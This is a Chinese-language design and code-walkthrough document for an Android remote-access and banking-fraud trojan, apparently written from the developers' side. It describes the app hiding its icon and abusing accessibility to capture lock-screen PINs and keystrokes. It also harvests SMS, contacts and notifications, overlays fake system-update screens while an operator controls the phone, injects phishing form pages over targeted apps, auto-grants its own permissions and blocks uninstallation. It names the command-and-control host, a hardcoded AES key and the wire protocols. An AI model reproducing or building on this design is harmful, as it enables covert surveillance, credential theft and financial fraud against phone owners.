## 三、运行主链路

### 3.1 入口

- 无桌面图标（Manifest 里 `MainActivity` `exported=false`、`excludeFromRecents`）。
- 三条拉起路径：① A 包装完拉起；② `BootReceiver`（含 7 个国产 ROM 私有开机广播 + `MY_PACKAGE_REPLACED`）；③ 面板指令（需已连上）。
- `AgentApp.onCreate` 只做一件事：预热 `AgentConfig`。

### 3.2 `onServiceConnected()` 时间线（`BoundaryAccessibilityService.kt:318-409`）

```
registerDefaultNetworkCallback     网络恢复后补上线
connect()                          有 token 走 AgentSocket，没 token 先 POST /api/client/online
AntiUninstallGuard.start()         仅当引导已完成 && !NO_GUARD && !moying_no_guard
GuardOverlay / 引导链              仅当引导未完成（或 NO_GUIDE）
  ├─ 非 MIUI：AdminActivator.attach + PermissionClicker.start + startPermissionWithRetry(36)
  └─ MIUI：MiuiFlowStep1()（应用详情页 → 其他权限 → 后台弹出界面 → 允许 → 再申请权限）
KeepAliveManager.startAll()        Job(15min) + 精确闹钟(3s 首启) + 媒体暖场
MoyingChannel.start()              adv.php bootstrap → engine.io WebSocket
BinaryChannel.start()              第二条通道（host 取自 adv.php 的 host 字段）
PixelKeepAlive / SensorKeepAlive / ScreenWatcher
startLockWatchdog()                黑屏 120s 无帧自动撤黑（moying_lock_timeout）

```

引导完成后（`scheduleRestAfterGate` / 100s 兜底，`:281-306`）写 `OnboardingState.markDone` 并启动守卫。

### 3.3 事件循环 `onAccessibilityEvent()`（`:1555-1591`）

一个事件按固定顺序过五道闸，全部 `runCatching` 包裹，互不影响：

1. `recordDebug` 采集事件类型/包名进调试队列；
2. `TYPE_WINDOW_STATE_CHANGED` → `InjectRepo.onForeground(pkg)`（注入判定）；
3. 同类型 → `AntiUninstallGuard.onWindowEvent(pkg, cls)`（守卫第 1 入口）；
4. 包名/类名含 `systemui` / `Keyguard` / `biometrics` → `PinCapture.onKeyguardWindow`（锁屏图案静默盯）；
5. 所有事件 → `SilentKeyMon.onEvent`（被动键盘）、`PinCapture.onEvent` + `ensurePolling`；
6. 末尾把 `nodesDirty=true`，有租约则 `scheduleNodeSnapshot`。

> 修正（第二轮核对）：`:482-499` 的 `fgTick`（400ms 前台轮询）与 `unusedAnchor()`、`miuiOverlayGateTick()` 在 3.4 里**都是死代码**（唯一调用者 `unusedAnchor` 本身无人调用）。3.4 的前台识别完全依赖 `onAccessibilityEvent`，没有轮询兜底；同 Activity 内跳转若不出窗口事件，注入判定会漏到下一次事件。

### 3.4 双协议栈并行（关键结构特征）

服务同时挂两条完全独立的通道，各自有自己的设备标识与指令集：

| | ScreenAgent 协议 | 墨影（2.2）协议 |
|---|---|---|
| 入口 | `HttpUploader` + `AgentSocket` | `MoyingChannel` + `BinaryChannel` |
| 上线 | `POST /api/client/online`（带 `X-Boundary-Request: 1`）→ 拿 `deviceToken` | `GET https://yk4.jk92.cc/adv.php?apk=&device=` → AES 解出 `host` |
| 长连 | `wss://<origin>/ws/device`，`Authorization: Bearer` | `wss://<host>/io/?EIO=3&transport=websocket&apkid=&device=&ver=` |
| 设备标识 | `DeviceIdentity.deviceId` = `SHA256(androidId\|apkId)` 前 16 位大写 | **原始 `ANDROID_ID`** |
| 指令 | `Protocol.ACTION_*`（`view.keepalive` / `input.tap` / `screen.stream.start` / `guard.set` …） | `MoyingActions`（`clickPoint` / `screen` / `readSmsList` … 见第五节） |
| 加密 | 无（Bearer + HTTPS） | `AES/ECB/PKCS5Padding`，密钥 `0623U25KTT3YO8P9`，Base64 |

> ⚠ 两套 ID 混用是最容易出错的点：`InjectRepo`、`MoyingChannel`、`BinaryChannel`、`InjectionActivity` 的 JS 桥 `getDeviceId()` 全用 **原始 ANDROID_ID**；而 `HttpUploader`、`OemProfiles.refreshRemote` 用 **哈希后的 deviceId**。面板侧必须按各自的键查，否则「设备在线但注入记录挂不上」。

## 四、指令面（墨影通道，`net/MoyingActions.kt`）

`handle()` 是一个大 `when(action)`，按语义分组（`:40-244`）：

**导航**：`home` / `back` / `recents` / `notifications` → `performGlobalAction`

**手势**：
- `clickPoint` / `tap`（`:494`）→ 坐标点击
- `gesture` / `gestureB` / `swipe` / `adbSwipe`（`:511`）→ 路径手势，`data.gesture[{x,y,t}]`
- `input` / `inputSend` / `text`（`:569`）→ 定位可编辑节点后 `ACTION_SET_TEXT`，失败退化为逐字 `typeText`（`:350`）

**画面**：
- `screen` / `takeScreen` / `silentShot` / `screenshot` → `startStream(400ms)` 5fps 推流（`:640`）
- `startStream` / `startScreen` / `startHD`（`fps` 1–15）→ 推流；`stopStream` 停止
- `shootWithPage`（`:666`）截图 + 同时抓一份 UI 树

**界面结构**：`uiTree` / `getTree` / `adbUiTree` / `capture`（注意：`capture` 是**树**不是截图）、`curpage`

**数据读取**：`readSmsList` / `readContactList` / `readAppList` / `readAlbumList`（`:936-998`）、`device_info`、`permissions`/`reqPerList`、`iconList`/`appList`/`installedApps`

**应用/锁屏**：`launch` / `startApk`、`wakeup`、`lockScreen`/`screenOff`/`lockNow`（`:387`）

**黑屏三档**：`lockNormal`（纯黑）/ `lockUpdate`（纯黑+亮度压 0）/ `lockAndroidUpdate`（假系统更新界面），可带 `alpha`/`brightness` 覆盖

**触摸拦截**：`blockTouch`（**仅当已处于黑屏才允许**，否则返回 `not_fullscreen`）、`unblockTouch`、`unlock`/`hideLockOverlay`

**解锁**：`smartUnlock`/`unlockScreen`/`v2Unlock`/`autoUnlock`（`:246`，唤醒→上滑→可选 PIN，先 `PinCapture.suppress(20s)` 避免自己画的图案被记成用户输入）、`verifyPin`/`capturePin`（主动弹凭据框采密码）、`stopPin`

**键盘**：`keylog`/`keys`/`getKeylog`（强制 flush）、`keymonOn`/`keymonOff`

**注入**：`transparent`/`openInject`/`injectPage`/`showInject`（url/pkg/template/fullscreen）、`reinject`、`skipInject`、`injectSettings`

**其它**：`oemPolicy`/`setOemPolicy`（服务器下发保活策略，落 SharedPreferences 覆盖 assets）、`uninstallSelf`、`ping`

> 交互类指令（`clickPoint`/`gesture`/`input`/`home`…，集合见 `INTERACTIVE_ACTIONS`）执行前会调 `TouchBlock.bypass(ms)` 开一个 450–3000ms 的「最小放行窗口」，动作完立即恢复拦截 —— 这是「用户点不动、我们点得动」的实现基础。

截图两条链路的分工（编码不同，别混）：
- **ScreenAgent 侧**：`captureViewerFrame`（`:860`）→ `takeAndUploadViewer`（`:876`）→ `shoot`（`:998`），统一 **JPEG**（`agent_config.capture`: 宽 540 / 质量 50），`frameGeneration` 自增丢弃迟到帧，上传走 `X-Capture-Mode: viewer-stream`。节拍：PROJECTION 按 `40ms - 上传耗时` 追赶（≈25fps 目标），ACCESSIBILITY 成功帧 0 延迟（由系统 `takeScreenshot` 往返自限速，实际约 1 张/秒），失败固定 500ms 退避。

## 六、权限 / 引导 / 保活 / 守卫

### 6.1 引导链

1. 无障碍连上 → `GuardOverlay.show`（无障碍 2032 浮层，`flags=280` 不抢焦点不拦触摸，尺寸 = 屏幕高 + 200 盖住导航栏，硬超时 120s，自动竖屏锁）
2. `PermissionActivity`（透明、`FLAG_NOT_TOUCHABLE`）一次性申请 **9 项**权限（`PermissionFlow`，API33 与低版本两套清单）
3. `PermissionClicker` 每 0.8s 扫窗口，按 `UiTexts.allow`（17 语言）**完全相等**匹配点「允许」，显式排除 `deny` 集合
4. 设备管理员：`DeviceAdminActivity` → `MoyingAdminReceiver.onEnabled` → `setKeyguardDisabledFeatures(160)` → 启动守卫 → HOME
5. 通知使用权：`NotificationAccessActivator`（标准页点自己那行 → 打开开关 → 电池计划 → 收尾）
6. 电池/保活：`BatteryPlan` 按机型顺序打开（MIUI 四步：自启动 → 省电策略无限制 → 后台弹出界面 → 白名单；每步 6s）

MIUI 特殊分支：后台拉起 Activity 会被 `MIUILOG- Permission Denied Activity` 拦，所以先 `MiuiFlowStep1`（应用详情页 → 其他权限管理 → 后台弹出界面 → 允许），`MiuiGate` 卡片每 2.5s 轮询 `canDrawOverlays` 放行后再申请运行时权限。

### 6.2 保活矩阵（`KeepAliveManager`，**故意无前台服务**）

JobScheduler（15min, persisted）· 精确闹钟 · 通知监听服务 · 无障碍服务 · 1px 不可见窗口（2032）· 传感器+屏幕事件监听 · `KeepAliveProvider`（`ContentProvider` 外部触发复活）· `KeepAliveDreamService` · `KeepAliveMediaService`（媒体浏览绑定）· Widget · 设备管理员。
快捷磁贴默认注释掉（下拉栏可见，太显眼）。

### 6.3 防卸载守卫（`AntiUninstallGuard`，责任链 + 短路）

两入口：窗口事件（带 className，最精准）+ 600ms 轮询。六层：

| 层 | 判定 | 开关 |
|---|---|---|
| ① 应用列表页 | ≥5 个「12.3 MB」式大小文本 | `moying_block_applist`（默认关） |
| ② 本应用详情页 | 设置族 + 应用名 + 卸载/强停文案 | 默认开 |
| ③ 危险类名 | `UninstallerActivity`/`DeviceAdminAdd`/`FactoryReset`… | 事件路径专用 |
| ④ 卸载确认框 | `packageinstaller` + `alertTitle` 精确等于应用名 | 常开 |
| ⑤ 多语言文字 | 取消激活/恢复出厂（17 语言），连续 2 次命中则 HOME | `moying_no_text_guard` 可关 |
| ⑥ 最终兜底 | 来源打分（设置/包安装器/各家安全中心）+ 窗口含**完全相等**的应用名或包名 | `moying_name_watch` / `moying_only_name_guard` |

所有处置动作只有一个：`GLOBAL_ACTION_BACK`（⑤ 第二次升级为 HOME）。`onDisableRequested` 里返回「系统服务正在更新，请稍后再试」并抢先 BACK。
`SelfUninstall` 反过来：**先** `suspendForUninstall` 停守卫 → 撤管理员 → `ACTION_DELETE` → 自己点「确定」（90 次 × 500ms）。

### 6.4 注入链路（`InjectRepo` + `InjectionActivity`）

```
GET /api/device-inject-settings?deviceId=<原始ID>&country=<cc>   （60s 节流）
   → settings[{id, package_name, app_name, template_url, fullscreen}]
前台包名命中 且 未注入过（SharedPreferences inject_state/inj_<pkg>）
   → InjectionActivity.start(url, pkg, template, fullscreen)     （全屏 Activity，不是悬浮窗）
   → 立即记 injected + POST /api/device-inject-track/inject
```
注入页双协议桥：`Android.returnResult(json)`（秘鲁新模板）与 `FKB.setFormData(json)`（旧模板）同时注册；`getPkg/getSn/getDeviceId/getAppLabel/getSdkInt` 供页面取值。上报统一打到 `/api/inj/result`。

## 十、待核对 / 已知不一致（技术清单）

1. **`agent_config.version = 3.1`**：3.4/3.5 两棵源码都没改，面板设备列表的 appVersion 全部会显示 3.1。要修就三处同步（`agent_config.json` / gradle 默认 / 服务器建包覆写）。
2. **`buildId = 5412ce7f`、`apkId = 1` 是模板残留**：非面板建包时设备会挂到 `apkId=1` 的账户下。
3. **两套设备标识并存**（哈希 deviceId vs 原始 ANDROID_ID），跨接口关联时必须确认用哪个。
4. **`MoyingChannel.APK_ID = "10020"` 常量**仅在 `agent_config.apkId` 为空时兜底，实际永远走配置值。
5. **`NO_GUIDE` 语义双重**：既关浮层，又让 `OnboardingState.isDone` 失效（重装不清数据时调试包仍会跑引导）。
6. **`strings.xml` 的 `app_name` 固定为 `love`**，`appName` 逐包覆盖依赖构建器改资源；直接 gradle 出包会印「love」。
7. **`INTERACTIVE_ACTIONS` 放行窗口**与 `TouchBlock` 的恢复任务是竞态敏感点：连续下发手势时以最后一次 `bypass(ms)` 为准。
8. **`lockWatchdog` 依赖 `MoyingActions.lastRequestAtMs()`**：只有墨影通道来帧才算保活，ScreenAgent 通道的指令不刷新它 —— 混用面板时会误判「无帧」自动撤黑。

## 十一、第二轮细节走查（`net/` 与指令面）

### 11.1 墨影通道帧格式（手写 engine.io v3）

```
上行：42["enc msg","<Base64(AES-ECB-PKCS5({"action":X,"type":"enc","data":{...}}))>"]
下行：42["new_msg","<Base64(AES-ECB-PKCS5({"action":X,"data":{...}}))>"]
握手：连上 → "40"；登录 → 42["login", deviceId]
保活：OkHttp ping 25s + 业务帧 30s（deviceOnline + diag，服务端 90s 判离线）
重连：3s×retry 线性，封顶 30s
```
`handleFrame` 状态机：`0`→回 `40`；`40`→login+online+permissions+diag+心跳；`2`→回 `3`；`41`→断线重连；其余 `42`→解密派发。非 `new_msg` 事件名一律忽略。

`adv.php` 返回的 `token` 用同一把 AES 密钥解密，得到 `{host, domain}`；`host` 不含点则拼 `host.domain`。解不出来就用硬编码 `yk4.jk92.cc` 继续连 —— **bootstrap 失败不阻断上线**。

### 11.2 二进制通道帧格式（`BinaryChannel`）

```
[1B type][4B 大端长度][payload]     一个 ws message 可串多帧，解析器带截断保护
```
| type | 常量 | 方向 | 内容 |
|---|---|---|---|
| 1 | `T_SCREEN` | 上行 | 截屏 JPEG q70 裸字节（约 60 KB，PNG 的 1/7） |
| 2 | `T_A11Y_TREE` | 上行 | 无障碍树 JSON UTF-8 |
| 16 | `T_COMMAND` | 下行 | 服务端命令 JSON |
| 33 | `T_PONG` | 双向 | 心跳应答 |
| 48 | `T_HELLO` | 上行 | 建连握手 `{"apkId":"10020"}` |
| 4/6/7 | `T_THUMB`/`T_HD`/`T_ADB` | — | 仅保留常量，本版未发送 |

URL：`wss://<adv.php host>/ws/binary-device?deviceId=<原始 ANDROID_ID>`，重连 2s×retry 线性封顶 30s。

### 11.3 截图编码的关键约束（踩过的坑）

- **WS 文本帧只认 PNG**：`refc2.py` 校验 `\x89PNG` 魔数才缓存 `last_screen`，发 JPEG 会被静默丢弃 → 面板黑屏。所以 `screenshot()` 主路径统一 `PNG q100` + 宽度压到 540（`MoyingActions.kt:797-841`）。
- **只有二进制通道开时才发 JPEG q70**（`T_SCREEN`），省掉 Base64 + AES + JSON 三重开销。
- `takeScreenshot` 回调失败码退避：`3`（间隔过短）300ms；`1` 连续 ≥3 次 5s；`1` 1.5s；其它 1s。
- **必须 `hardwareBuffer.close()`**：不关会泄漏，之后所有截图返回 error 1。
- 黑屏态走 `shootWithPage`：抓干净桌面 → `BlackScreen.gainLockedFrame`（整帧 ×40 + 50 把暗部拉亮）→ 再叠回遮罩，所以「用户看黑、面板看得到」。

### 11.4 推流节奏（`streamLoop`）

拍一张 → 上报 → 成功回调里 200ms 后拍下一张，**不按固定间隔**（真实上限受系统无障碍截屏频率限制，约 1 张/秒）。
- `startStream(intervalMs)` 会把值 clamp 到 120–3000ms 存进 `streamIntervalMs`，但 `streamLoop` **并未使用它**做节流 —— 参数实际只是日志。
- 每 2s 顺带推一次 `uiTree`。
- **8 秒收不到任何下行帧自动停流**（`lastRequestAt` 判定）。

### 11.6 各采集分支的实际上限

| 数据 | 查询/来源 | 上限 | 字段 |
|---|---|---|---|
| 短信 | `content://sms`，`date DESC` | 100 | `from/body/date/type` |
| 通讯录 | `Phone.CONTENT_URI` | 300 | `name/phone` |
| 相册 | `MediaStore.Images` `date_added DESC` | 50 | `id/date/size`（**仅元数据，无图片字节**） |
| 应用 | `getInstalledPackages` | 300 / 1500（`AppList` 全量含无图标包） | `pkg/name` |
| 通知 | `NotificationListenerService` | 4 分钟去重窗口 | `pkg/title/text/bigText/subText` |

`AppList` 与 `readApps` 是两条不同实现：前者 `limit=1500` 且显式包含无 launcher 图标的包（注释：银行插件类），后者 `take(300)` 只做常规列表。

### 11.7 `sendOnline()` 上报画像（面板侧依赖最重的帧）

外层 `{deviceId, pkg:"android", apps:null, deviceInfo{...}}`，`deviceInfo` 共 30+ 字段：`myPkg/topPkg/appName/accName/apkVer/apkid/worker`、`timeZone/area/country/lang/localTime`、`brand/model/version/sdk`、`battery/charging/network/screen`、**`screenWidth/screenHeight`**（面板换算点击坐标用，缺省按 1080×2400 猜）、`sim/accessibility/antiUninstall/batteryPath`，以及嵌套 `oem{manufacturer,brand,model,battery[],autostart[],clickDelayMs,adminFlow,notificationFlow,notes}`。

`sendPermissions()` 有一处硬编码：`granted` 里**无条件**塞入 `READ_SMS`、`READ_CONTACTS`，与实际授权状态无关；`sendDiag()` 则是服务端写 `device_info.acc` 的唯一来源，不发则面板无障碍列永远显示「未开启」。

### 11.8 环境旁路

- `moying_save_shot=1` → 每帧落盘 `getExternalFilesDir(null)/panel_shot.png`。
- `moying_no_wake_activity=1` → 禁止用 `WakeActivity` 亮屏，只允许 WakeLock（`wakeScreen` 回 `wakelock_failed_no_activity`）。
